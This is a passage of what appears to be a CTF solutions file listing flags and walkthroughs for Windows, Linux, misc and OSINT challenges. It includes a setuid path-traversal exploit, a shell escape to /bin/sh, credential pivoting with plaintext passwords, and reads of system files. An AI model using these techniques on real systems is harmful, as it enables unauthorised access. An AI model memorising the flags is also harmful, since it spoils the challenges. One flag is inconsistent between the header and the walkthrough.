- In the tool: *File → Load External Registry Files* → point it to the exported `SYSTEM` and `SECURITY` hives (it also needs `SAM`).
- It lists the three questions with their stored answers (the answers are encoded, not yet the flag):
  - `Q1NDVEZ7dzFuZDB3NV81M2N1cjE3eV8=` (Base64)
  - `dh35710a5_4e3_` (ROT13)
  - `ck}030d` (Caesar shift)
<br>

#### 3. Decode and assemble the flag
```bash
# Part 1: Base64
echo 'Q1NDVEZ7dzFuZDB3NV81M2N1cjE3eV8=' | base64 -d
# -> CSCTF{w1nd0w5_53cur17y_

# Part 2: ROT13
echo 'dh35710a5_4e3_' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
# -> qu35710n5_4r3_

# Part 3: Caesar (+3) on letters
# The third answer appears as `ck}030d`; per the challenge notes, treat it as a +3 Caesar to get `c00k3d}`
```

Combine the three decoded parts:
`CSCTF{w1nd0w5_53cur17y_qu35710n5_4r3_c00k3d}`
<br>



<br>
<br>

---

# 🚩 LINUX 🚩

## <span style="color:#1E88E5">&#9679;</span> Interview-1

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{f1Rst_f1@g_r00k13}`<br>
> **Deployment:** `docker`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
Linux Interview #1
Introduction
Connect via SSH with `ctf`:`ctf` on the custom port.

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
No downloadable files.

#### Hints
No hints provided.

---

### Solution Walkthrough

1. SSH in as `ctf`/`ctf` and start the interview REPL for `interview-1`.
2. Feed each prompt with the expected command (order matters).
3. Finish all stages to receive the flag `CSCTF{f1Rst_f1@g_r00k13}`.

#### 1. Connect and launch the challenge
```bash
ssh ctf@<challenge-host> -p <port>
# once in the box
```
<br>

#### 2. Answer the prompts in order
Type these commands as each question appears:
```plain
whoami
id -u
echo "I love 5 rounds of interviews"
pwd
groups
hostname
hostname -s
env
who
command -v ls
echo $USER
echo $HOME
echo $SHELL
uname -s
readlink -f /bin/sh
cat /etc/passwd
```
<br>

#### 3. Collect the flag
After the last command, the program prints the flag:
```
CSCTF{f1Rst_f1@g_r00k13}
```
<br>



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> Interview-2

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{s3c0nD_r0und_k1ddie}`<br>
> **Deployment:** `docker`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
wLinux Interview #2
Practical ops
Connect via SSH with `ctf`:`ctf` on the custom port.

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
No downloadable files.

#### Hints
No hints provided.

---

### Solution Walkthrough

1. SSH as `ctf`/`ctf` and launch the `interview-2` slug.
2. Reply to each prompt with the listed command.
3. After the final prompt, grab the flag `CSCTF{s3c0nD_r0und_k1ddie}`.

#### 1. Connect and start the session
```bash
ssh ctf@<challenge-host> -p <port>
```
<br>

#### 2. Commands to answer every prompt
Enter these in order as asked:
```plain
echo $PATH
ls -l /
ls -la /bin
command -v ls
uname -r
grep "^NAME=" /etc/os-release
wc -l /etc/passwd
cut -d: -f1 /etc/passwd
grep "^root:" /etc/passwd
df -h /
free -h
nproc
date -I
uptime -s
last
```
<br>

#### 3. Flag
Program prints:
```
CSCTF{s3c0nD_r0und_k1ddie}
```
<br>



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> Interview-3

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{jUsT_s0m3_f1L3S_yOu_sh0u1d_kn0w}`<br>
> **Deployment:** `docker`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
Linux Interview #3
System Files
Connect via SSH with `ctf`:`ctf` on the custom port.

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
No downloadable files.

#### Hints
No hints provided.

---

### Solution Walkthrough

1. SSH as `ctf`/`ctf` and launch the `interview-3` slug.
2. Respond to each file-inspection prompt with the correct command.
3. Complete all stages to see `CSCTF{jUsT_s0m3_f1L3S_yOu_sh0u1d_kn0w}`.

#### 1. Connect and start the challenge
```bash
ssh ctf@<challenge-host> -p <port>
```
<br>

#### 2. Commands for every prompt
Enter these in sequence:
```plain
cat /etc/os-release
cat /etc/hostname
cat /etc/hosts
cat /etc/resolv.conf
cat /etc/nsswitch.conf
cat /etc/passwd
cat /etc/group
cat /etc/shells
cat /etc/login.defs
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_config
cat /etc/fstab
cat /etc/debian_version
cat /proc/1/comm
cat /etc/motd
```
<br>

#### 3. Flag
Displayed after the last command:
```
CSCTF{jUsT_s0m3_f1L3S_yOu_sh0u1d_kn0w}
```
<br>



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> Interview-4

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{c0nfigur4+i0n_4nd_p3rf3c+_si+u4+i0n}`<br>
> **Deployment:** `docker`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
Linux Interview #4
Configurations
Most answers reside in a file. Good luck!
Connect via SSH with `ctf`:`ctf` on the custom port.

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
No downloadable files.

#### Hints
No hints provided.

---

### Solution Walkthrough

1. SSH as `ctf`/`ctf` and launch the `interview-4` slug.
2. Provide the required commands in order (system/network config focus).
3. Collect the printed flag `CSCTF{c0nfigur4+i0n_4nd_p3rf3c+_si+u4+i0n}`.

#### 1. Connect and start
```bash
ssh ctf@<challenge-host> -p <port>
```
<br>

#### 2. Commands to answer each prompt
Enter these sequentially:
```plain
readlink -f /etc/localtime
locale charmap
head -n 10 /proc/self/limits
findmnt -no FSTYPE,OPTIONS /
cat /proc/sys/net/ipv4/ip_forward
cat /proc/sys/net/ipv4/tcp_syncookies
cat /proc/sys/net/ipv4/tcp_keepalive_time
cat /proc/sys/net/ipv4/ip_local_port_range
cat /proc/sys/net/core/somaxconn
hostname -I
cat /proc/net/route
cat /proc/net/dev
head -n 20 /proc/net/snmp
head -n 10 /proc/net/tcp
cat /etc/nsswitch.conf
cat /etc/resolv.conf
sh -c "openssl version && openssl version -d"
ssh -Q cipher
cat /proc/net/arp
cat /sys/class/net/eth0/address
cat /sys/class/net/eth0/mtu
ssh -G 127.0.0.1 -p 22 | head -n 20
```
<br>

#### 3. Flag
Printed after the final prompt:
```
CSCTF{c0nfigur4+i0n_4nd_p3rf3c+_si+u4+i0n}
```
<br>



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> MultiDB

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{0whOwSw3et_Y0u!nt3rR@ct3d_w/mYD@t2baS3s}`<br>
> **Deployment:** `docker`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
We will talk about Data Bases. How many do you know? Which ones? Are you sure? What are you doing here?
Anyway, just play, we'll figure out the flag later.
Connect via SSH with `ctf`:`ctf` on the custom port.

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
No downloadable files.

#### Hints
No hints provided.

---

### Solution Walkthrough

1. Use the hidden pgpass to read Redis details from PostgreSQL.
2. Query Redis to learn where the SQLite file (with DB creds) lives.
3. Pull MySQL credentials from the SQLite DB.
4. Log into MySQL and read the final flag.

#### 1. Postgres → get Redis secrets
```bash
export PGPASSFILE=/home/ctf/.config/chronos/.pgpass
psql -h 127.0.0.1 -U ops_reader -d chronos_ops \
  -c "SELECT k, v FROM ops.kv;"
# Reveals: redis_password=R3dis_Production_2025 and redis host/port.
```
<br>

#### 2. Redis → locate SQLite
```bash
redis-cli -a R3dis_Production_2025 GET chronos:sqlite_path    # -> /opt/chronos/audit.db
redis-cli -a R3dis_Production_2025 GET chronos:sqlite_note    # cred table pointer
```
<br>

#### 3. SQLite → extract MySQL creds
```bash
sqlite3 /opt/chronos/audit.db "SELECT * FROM credentials;"
# mysql_user=maint
# mysql_password=Maint-Only-2025
# mysql_host=127.0.0.1
# mysql_db=chronos_core
```
<br>

#### 4. MySQL → grab the flag
```bash
mysql -h 127.0.0.1 -u maint -p'Maint-Only-2025' chronos_core \
  -e "SELECT value FROM secrets WHERE name='final_flag';"
```

Flag returned by the service:
```
CSCTF{0w_hOw_Sw3et_Y0u_!nt3rR@ct3d_w/mY_D@t2baS3s}
```
<br>



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> Shadow Home

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{m0unT@1N_of_P3Rm!44ionS}`<br>
> **Deployment:** `docker`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief


**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
No downloadable files.

#### Hints
No hints provided.

---

### Solution Walkthrough

1. SSH in as `chronos`/`chronos` and read the provided helper note (`README-shadowctl.txt`).
2. Confirm the setuid helper `/opt/ctf/shadowctl` and how it mounts case folders into `~/shadow`.
3. Abuse the helper’s naive path check to mount a legacy archive and read the flag.

#### 1. Recon the environment
```bash
ssh chronos@<challenge-host> -p <port>         # password: chronos
id && groups
ls ~
cat ~/README-shadowctl.txt
find / -maxdepth 4 -group legalops 2>/dev/null
```
Key facts from recon/README:
- You’re in group `legalops`; helper is setuid root and group-exec: `/opt/ctf/shadowctl`.
- It copies trees from `/srv/legal-hold/cases/<case-id>` into `~/shadow/<target>`.
- Archives live in `/srv/legal-hold/cases-archive/` (e.g., `kms-legacy-2022`).
<br>

#### 2. Observe normal helper use (optional)
```bash
mkdir -p ~/shadow/case-2025-10-03
/opt/ctf/shadowctl mount case-2025-10-03 ~/shadow/case-2025-10-03
ls ~/shadow/case-2025-10-03
```
This confirms it copies from `/srv/legal-hold/cases/case-2025-10-03` with group-readable files.
Bug: the helper builds `/srv/legal-hold/cases/<case-id>`, resolves it, and only checks that the real path stays under `/srv/legal-hold` (not strictly under `/srv/legal-hold/cases`). A crafted `../cases-archive/...` case-id therefore lands in the archive tree.
<br>

#### 3. Path-traversal to the archive flag
```bash
mkdir -p ~/shadow/pwn
/opt/ctf/shadowctl mount \
  'case-2025-10-03/../../cases-archive/kms-legacy-2022' \
  ~/shadow/pwn
ls -l ~/shadow/pwn
cat ~/shadow/pwn/kms-restore-token.txt
```
The archive contains the flag:
```
CSCTF{m0unT@1N_of_P3Rm!44ionS}
```
<br>



<br>
<br>

---

# 🚩 MISC 🚩

## <span style="color:#1E88E5">&#9679;</span> Brainrottalk

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{SK1B1D1_P4ST4_R3S0N4NC3_6_7}`<br>
> **Deployment:** `dynamic`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
An audio clip full of strange beeps. Can you pull a message out of the noise?

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
- `files/Brainrot.mp3`

#### Hints
No hints provided.

---

### Solution Walkthrough

1. Convert and clean the audio.
2. Decode the ultrasonic data with `ggwave`.
3. Read the flag.

#### 1. Convert and clean the audio
```bash
ffmpeg -i files/Brainrot.mp3 -ac 1 -ar 48000 brainrot.wav
sox brainrot.wav brainrot_clean.wav noisered   # optional
```
<br>

#### 2. Decode the ultrasonic data with `ggwave`
```bash
python3 - <<'PY'
import ggwave, soundfile as sf
data, sr = sf.read("brainrot_clean.wav")
pcm = (data * 32767).astype('int16').tobytes()
print(ggwave.decode(pcm, sr).decode())
PY
```
<br>

#### 3. Read the flag
```
CSCTF{SK1B1D1_P4ST4_R3S0N4NC3_6_7}
```
<br>



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> CyberSonics-1

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{W4V35_4R3_FUN}`<br>
> **Deployment:** `dynamic`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
A short audio file made of beeps. There is a text hidden in those tones.

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
- `files/cybersonicspt1.wav`

#### Hints
No hints provided.

---

### Solution Walkthrough

1. Slice the audio.
2. Extract peak frequencies.
3. Read the flag.

#### 1. Slice the audio
```bash
python3 solve.py   # uses files/cybersonicspt1.wav
```
The provided script splits the WAV into 0.5s blocks.
<br>

#### 2. Extract peak frequencies
For each block, find the dominant FFT bin (≈ ASCII code):
```bash
python3 - <<'PY'
import numpy as np
from scipy.io.wavfile import read
from scipy.fft import rfft, rfftfreq
sr,a=read("files/cybersonicspt1.wav"); a=a.astype(float)/32767; step=int(sr*0.5)
chars=[]
for i in range(0,len(a),step):
    chunk=a[i:i+step]; w=(chunk-np.mean(chunk))*np.hanning(len(chunk))
    spec=np.abs(rfft(w)); freqs=rfftfreq(len(w),1/sr)
    chars.append(chr(int(round(freqs[np.argmax(spec)]))))
print("".join(chars))
PY
```
<br>

#### 3. Read the flag
Output from either method:
```
CSCTF{W4V35_4R3_FUN}
```
<br>



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> CyberSonics-2

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{X0r_0r_n0t_X0r_Th4t_1s_Th3_Qu3st10n}`<br>
> **Deployment:** `dynamic`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
A beepy audio track split by a silence in the middle. Somewhere in there is the flag.

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
- `files/cybersonics-pt2.wav`

#### Hints
No hints provided.

---

### Solution Walkthrough

1. Split and decode the tone streams.
2. Recover the Base64 blobs.
3. XOR to get the flag.

#### 1. Split and decode tones
Use the provided script:
```bash
python3 solve.py   # reads files/cybersonics-pt2.wav
```
The script trims padding, finds the ~3s silence, and decodes tones (0.5s each) to ASCII.
<br>

#### 2. Recover Base64 blobs
Output from the script:
```
Key: <key_b64>
Encrypted: <cipher_b64>
```
Each comes from the dominant frequency per chunk (freq ≈ ASCII code).
<br>

#### 3. XOR to get the flag
The script Base64-decodes both strings and XORs them (`cipher[i] ^ key[i % len(key)]`), printing:
```
CSCTF{X0r_0r_n0t_X0r_Th4t_1s_Th3_Qu3st10n}
```
<br>



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> CyberSonics-3

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{waves_are_not_as_fun_when_they_are_mixed_up}`<br>
> **Deployment:** `dynamic`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
A wall of beeps made from very short tones and tiny pauses.
Somewhere in there, the message lives.
Literally 1984

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
- `files/cybersonicspt3.wav`

#### Hints
No hints provided.

---

### Solution Walkthrough

1. Derive the frequency map.
2. Decode the tone stream.
3. Read the flag.

#### 1. Derive the frequency map
Use the helper to cluster peak frequencies:
```bash
python3 - <<'PY'
import numpy as np, json
from scipy.io.wavfile import read
from scipy.fft import rfft, rfftfreq
sr,a=read("files/cybersonicspt3.wav")
if a.dtype==np.int16: a=a.astype(float)/32767
chunk=int(sr*0.05); gap=int(sr*0.10); freqs=[]
for i in range(0,len(a),gap):
    tone=a[i:i+chunk];
    if len(tone)<10: break
    w=(tone-np.mean(tone))*np.hanning(len(tone))
    spec=np.abs(rfft(w)); fr=rfftfreq(len(w),1/sr)
    band=(fr>=35)&(fr<=155); f=fr[band][np.argmax(spec[band])]
    freqs.append(round(f,3))
json.dump({chr(33+i):f for i,f in enumerate(sorted(set(freqs)))}, open("key.json","w"), indent=2)
PY
```
<br>

#### 2. Decode the tone stream
```bash
python3 solve.py   # needs cybersonicspt3.wav and key.json
```
`solve.py` reads the key map and replaces each tone’s peak frequency with the mapped character.
<br>

#### 3. Read the flag
The decoded passage concludes with:
```
CSCTF{waves_are_not_as_fun_when_they_are_mixed_up}
```
<br>



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> Parano1d

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{PARANOID_CONTRACTORS_ARE_THE_WORST}`<br>
> **Deployment:** `dynamic`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
A paranoid contractor’s USB image with layers of locks. Pick it apart to see what they’re hiding.

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
- `files/PARANOID-USB.zip`

#### Hints
No hints provided.

---

### Solution Walkthrough

1. Read the included notes to gather passphrases and layout.
2. Decrypt `vault.cpt` and open the KeePass database to recover keys.
3. (Optional) Extract the VeraCrypt keyfile and mount.
4. Decrypt the final handoff.

#### 1. Read the included notes to gather passphrases and layout
```bash
7z x PARANOID-USB.zip
cat PARANOID-USB/protect/notes/methodology.txt
cat PARANOID-USB/protect/notes/risk_register.txt
```
You learn: ccrypt pass `nightshiftheron25!`, KeePass master `nightshiftHERON25!`, VeraCrypt pass `retainer-escrow-25`, key fragment appended to `finances/ledger.png`, age key stored in KeePass.
<br>

#### 2. Decrypt `vault.cpt` and open the KeePass database to recover keys
```bash
cd PARANOID-USB/protect
ccrypt -d vault.cpt   # nightshiftheron25!
keepassxc-cli show -q ../keepass/client-plan-v4.kdbx 'age key'  # master: nightshiftHERON25!
# save the displayed age private key to age.key
```
KeePass also documents the VeraCrypt settings if needed.
<br>

#### 3. (Optional) Extract the VeraCrypt keyfile and mount
```bash
python3 - <<'PY'
from pathlib import Path
p=Path("PARANOID-USB/finances/ledger.png").read_bytes()
idx=p.rfind(b'IEND')+8
Path("keyfile.bin").write_bytes(p[idx:])
PY
veracrypt --text --mount PARANOID-USB/finances/retainer.vc \
  --password='retainer-escrow-25' --keyfiles=keyfile.bin
```
This shows the HERON evidence; not required for the flag.
<br>

#### 4. Decrypt the final handoff
```bash
age -d -i age.key PARANOID-USB/handoff/handoff.txt.age
```
Output:
```
CSCTF{PARANOID_CONTRACTORS_ARE_THE_WORST}
```
<br>



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> Rnd

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{r@n0m_1s_n3V#R_en0UGH}`<br>
> **Deployment:** `docker`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
A memory-pattern webgame running in debug mode. Reverse what drives the sequence and beat all levels.

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
No downloadable files.

#### Hints
No hints provided.

---

### Solution Walkthrough

1. Capture the leaked outputs.
2. Recover the RNG and predict patterns.
3. Collect the flag.

#### 1. Capture the leaked outputs
```bash
websocat ws://<host>:8000/ws
# first JSON includes preview_outputs_dec: [x0, x1, x2]
```
<br>

#### 2. Recover the RNG and predict patterns
LCG: `x_{n+1} = (a*x_n + c) mod m`, `m = 4294967291`.
```bash
pip install websockets
python3 - <<'PY'
import asyncio,json,websockets
MOD=4294967291
inv=lambda x: pow(x%MOD, MOD-2, MOD)
step=lambda a,c,x:(a*x+c)%MOD
async def run():
 w=await websockets.connect("ws://<host>:8000/ws")
 hello=json.loads(await w.recv()); x0,x1,x2=map(int,hello["preview_outputs_dec"])
 a=((x2-x1)%MOD)*inv((x1-x0)%MOD)%MOD; c=(x1-a*x0)%MOD; x=x2
 await w.send(json.dumps({"type":"start"}))
 while True:
  m=json.loads(await w.recv())
  if m["type"]=="level":
   need,cards=int(m["need"]),int(m["cards"])
   seq=[]
   for _ in range(need):
    x=step(a,c,x); seq.append(int(x%cards))
   await w.send(json.dumps({"type":"answer","indices":seq}))
  elif m["type"]=="flag":
   print(m["flag"]); return
asyncio.run(run())
PY
```
<br>

#### 3. Collect the flag
Server response after level 5:
```
CSCTF{r@n0m_1s_n3V#R_en0UGH}
```
<br>



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> Romeo and Julia

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{jul1a_pr0gramm1ng_1s_4_th1ng}`<br>
> **Deployment:** `dynamic`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief


**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
No downloadable files.

#### Hints
No hints provided.

---

### Solution Walkthrough

1. Connect.
2. Escape to shell.
3. Read the flag.

#### 1. Connect
```bash
nc <host> <port>
This is the tragedy of Romeo and Julia...
```
<br>

#### 2. Escape to shell
```bash
run(`/bin/sh`)
```
If successful, you drop into `/bin/sh`.
<br>

#### 3. Read the flag
```bash
cat /flag.txt
# CSCTF{jul1a_pr0gramm1ng_1s_4_th1ng}
```
<br>



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> Secret

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{just_anoth3R_R1P0}`<br>
> **Deployment:** `dynamic`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
There are many secrets out there.
Some of them can be told, and some of them should stay encrypted.
At least until you figure out their history...

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
- `files/acme-analytics.zip`

#### Hints
- **Hint 1** (cost 15)
  You should definitely not use git-crypt and use it to decrypt the flag, after you have found the data key in the rev-list.
<br>


---

### Solution Walkthrough

### Solution Steps

```plain
1) Inspect the files. Notice the flag exists but is unreadable and looks like git-crypt output.
2) Prove it's git-crypt. Look for git-crypt markers and configuration.
3) Hunt the leaked git-crypt data key in the Git history.
4) Decode the key if base64, unlock the repo, read secrets/flag.txt.
```

<br>

### 1) Inspect the files

Unzip the archive and try to read the flag. You'll see binary noise.

```bash
unzip challenge.zip && cd repo
ls -R
head -c 64 secrets/flag.txt | hexdump -C
strings -n 8 secrets/flag.txt | head
```

Typical clue: first bytes include `GITCRYPT`, or `file` reports just "data".

```bash
file secrets/flag.txt
```

<br>

### 2) Prove it's git-crypt

Look for git-crypt configuration that tells Git which paths are encrypted.

```bash
grep -n 'git-crypt' .gitattributes || true
ls -a .git-crypt 2>/dev/null || true
```

If `git-crypt` is missing locally, install it:

```bash
# Debian/Ubuntu
sudo apt-get update && sudo apt-get install -y git-crypt
# macOS (Homebrew)
brew install git-crypt
```

<br>

### 3) Hunt the leaked key in history

The challenge premise: a past commit accidentally committed the **git-crypt data key** (raw or base64). Search the whole object list for filenames like `git-crypt.key` or `git-crypt.key.b64`.

```bash
# Ensure you are at the repo root containing .git
[ -d .git ] || { echo "run from repo root"; exit 1; }

git rev-list --objects --all \
| awk '$2 ~ /git-crypt\.key(\.b64)?$/ {print $1" "$2}'
```

Pick the first hit. Extract the blob:

```bash
BLOB=<paste_blob_id_here>
git cat-file -p "$BLOB" > /tmp/key.src
```

If you don't see a hit, widen the search:

```bash
git log --all --name-only --pretty=oneline | grep -Ei 'git-crypt(\.key|\.b64|key)'
git grep -a --all-match -n 'GITCRYPT' $(git rev-list --all)
```

<br>

### 4) Decode (if base64), unlock, read flag

If the leaked filename had `.b64` or the blob looks base64, decode:

```bash
base64 -d /tmp/key.src > /tmp/key.bin 2>/dev/null || base64 -D /tmp/key.src > /tmp/key.bin
```

Else copy raw:

```bash
cp /tmp/key.src /tmp/key.bin
```

Unlock and read:

```bash
git-crypt unlock /tmp/key.bin
cat secrets/flag.txt
```

You now have the flag.



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> White Noise

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{not_just_noise_there_is_a_fl4g}`<br>
> **Deployment:** `docker`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
A noisy TCP service on port 1337 that mostly spews random junk; somewhere in the stream, a flag appears.

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
No downloadable files.

#### Hints
No hints provided.

---

### Solution Walkthrough

1. Connect and listen to the noisy TCP stream.
2. Filter printable text until the flag appears.
3. Grab the flag when it surfaces.

#### 1. Connect and listen
```bash
nc <host> 1337
```
The service spits random bytes with occasional beacon packets.
<br>

#### 2. Filter for printable text
```bash
nc <host> 1337 | strings -n 8
```
Or use a small loop to buffer and search:
```bash
python3 - <<'PY'
import socket,re
s=socket.create_connection(("<host>",1337))
buf=b""
while True:
    data=s.recv(4096)
    if not data: break
    buf+=data
    m=re.search(b"CSCTF\\{[^}]+\\}", buf)
    if m: print(m.group().decode()); break
    if len(buf)>20000: buf=buf[-4000:]
PY
```
<br>

#### 3. Read the flag
Expected flag the service emits every few seconds:
```
CSCTF{not_just_noise_there_is_a_fl4g}
```
<br>



<br>
<br>

---

# 🚩 OSINT 🚩

## <span style="color:#1E88E5">&#9679;</span> Domain

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{no_yes_no_no_no_no_no_yes_yes_yes}`<br>
> **Deployment:** `dynamic`<br>
> **Scoring:** max 200, decay 50, min 50


---

### Overview

#### Challenge Brief
Go to https://web-check.xyz/ and scan `mirachron.com`.
Answer the checks below in order with `yes` or `no` in lowercase.
Checks (in this exact order):
1. Is a Strict-Transport-Security header present on `https://mirachron.com`?
2. Does the HSTS policy include all subdomains?
3. Is a Content-Security-Policy header present?
4. Is X-Content-Type-Options present?
5. Is an Access-Control-Allow-Origin header present?
6. Is DNSSEC enabled for `mirachron.com`?
7. Does `mirachron.com` publish a DMARC record?
8. Does `mirachron.com` have MX records configured?
9. Is `/.well-known/security.txt` present?
10. Is a web application firewall detected?
Example : `CSCTF{no_yes_no_yes_no_yes_no_yes_no_yes}`

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
No downloadable files.

#### Hints
No hints provided.

---

### Solution Walkthrough

1. Scan the target.
2. Record the answers.
3. Build the flag.

#### 1. Scan the target
```text
Visit https://web-check.xyz → scan mirachron.com → open the detailed results.
```
<br>

#### 2. Record the answers
1) Strict-Transport-Security present? **no**
2) HSTS include all subdomains? **yes**
3) Content-Security-Policy present? **no**
4) X-Content-Type-Options present? **no**
5) Access-Control-Allow-Origin present? **no**
6) DNSSEC enabled? **no**
7) DMARC record published? **no**
8) MX records configured? **yes**
9) `/.well-known/security.txt` present? **yes**
10) Web application firewall detected? **yes**
<br>

#### 3. Build the flag
```
CSCTF{no_yes_no_no_no_no_no_yes_yes_yes}
```
<br>



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> History

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{2025-11-07}`<br>
> **Deployment:** `dynamic`<br>
> **Scoring:** max 200, decay 50, min 50


---

### Overview

#### Challenge Brief
You're confirming when `2025.chronos-security.ro` was first captured by the Internet Archive.
Find the earliest snapshot and convert its timestamp to ISO date (YYYY-MM-DD).
Submit that date in the flag.

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
No downloadable files.

#### Hints
No hints provided.

---

### Solution Walkthrough

1. Open the Internet Archive.
2. Note the first capture.
3. Build the flag.

#### 1. Open the archives
Go to `https://web.archive.org/web/*/2025.chronos-security.ro` and list captures.
<br>

#### 2. Note the first capture
The earliest snapshot is dated `2025-11-07`.
<br>

#### 3. Build the flag
```
CSCTF{2025-11-07}
```
<br>



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> MITRE

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{T1041-Exfiltration}`<br>
> **Deployment:** `dynamic`<br>
> **Scoring:** max 200, decay 50, min 50


---

### Overview

#### Challenge Brief
Cobalt Strike can set its beacon payload to reach out to the C2 server on an arbitrary and random interval and Machete sends stolen data to the C2 server every 10 minutes.
Blending malicious traffic within normal activity is one of the final parts of a red team's attack and it is very thoroughly documented. Can you distinguish the tactic's name and technique ID? You surely know the platform to do the job.
Example: `CSCTF{T1557.004-Credential_Access}`

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
No downloadable files.

#### Hints
No hints provided.

---

### Solution Walkthrough

1. Search MITRE ATT&CK.
2. Open the technique entry.
3. Build the flag.

#### 1. Search MITRE ATT&CK
Use ATT&CK navigator/site to look for techniques involving sending stolen data on a schedule; this points to "Exfiltration Over C2 Channel".
<br>

#### 2. Open the technique entry
The matching page is **T1041 – Exfiltration Over C2 Channel**.
<br>

#### 3. Build the flag
ID and tactic:
```
CSCTF{T1041-Exfiltration}
```
<br>



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> Pwned

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{11971-342}`<br>
> **Deployment:** `dynamic`<br>
> **Scoring:** max 200, decay 50, min 50


---

### Overview

#### Challenge Brief
Investigate a major breach entry on Have I Been Pwned for the romanian subsidiary of the telecom company Orange.
We want you to report how many files and folders were stolen in those near 6.5GB worth of data.
Example: `CSCTF{12345-700}`

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
No downloadable files.

#### Hints
No hints provided.

---

### Solution Walkthrough

1. Check the breach entry.
2. Read the linked article.
3. Extract the counts and build the flag.

#### 1. Find the breach entry
```text
https://haveibeenpwned.com/Breach/OrangeRomania
```
Scroll to the "Source of breach" link.
<br>

#### 2. Open the referenced article
Article: https://www.bleepingcomputer.com/news/security/orange-group-confirms-breach-after-hacker-leaks-company-documents/
<br>

#### 3. Read the counts and build the flag
In the article’s image, the shared folder shows **11971 files** and **342 folders**.
```
CSCTF{11971-342}
```
<br>



<br>
<br>

## <span style="color:#1E88E5">&#9679;</span> Sakot

> Points: **0** · Solves: **0**

> **Flag:** `CSCTF{60.1618,24.9395}`<br>
> **Deployment:** `dynamic`<br>
> **Scoring:** max 500, decay 50, min 100


---

### Overview

#### Challenge Brief
Locate where the provided 3D scan was taken. Submit latitude and longitude rounded to 4 decimals, with no spaces.

**Flag format:** Flag format: **`CSCTF{message}`**

---

### Resources

#### Files
- `files/textured_output.obj`
- `files/textured_output.mtl`
- `files/textured_output.jpg`

#### Hints
No hints provided.

---

### Solution Walkthrough

1. Load the provided 3D scan files to view the full scene.
2. Identify the real-world location by matching the scene to satellite/street imagery.
3. Extract the coordinates, round to 4 decimals, and build the flag.

#### 1. Load the 3D scan
